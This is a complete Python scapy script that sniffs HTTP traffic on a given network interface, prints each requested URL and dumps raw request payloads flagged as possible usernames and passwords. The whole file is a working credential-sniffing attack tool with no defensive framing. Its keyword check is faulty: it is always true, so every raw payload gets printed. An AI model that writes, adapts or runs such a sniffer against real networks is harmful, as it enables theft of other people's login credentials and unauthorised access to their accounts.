import scapy.all as scapy
#from scapy.layers import http
from scapy_http import http
import argparse


def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help= "specify the interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-]Enter an interface to sniff")
    return options


def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packets)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        #keywords = ["username", "login", "password", "pass"]
        #for keyword in keywords:
        if "username"or "login"or "password"or "pass" in load:
                return load

def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>>" + str(url))
        login_edit= get_login_info(packet)
        if login_edit:
            print("\n\n[+] Possible/login/info >>>>>" + str(login_edit) + "\n\n")
int = arg_parse()
sniff(int.interface)


    #sniff("eth0")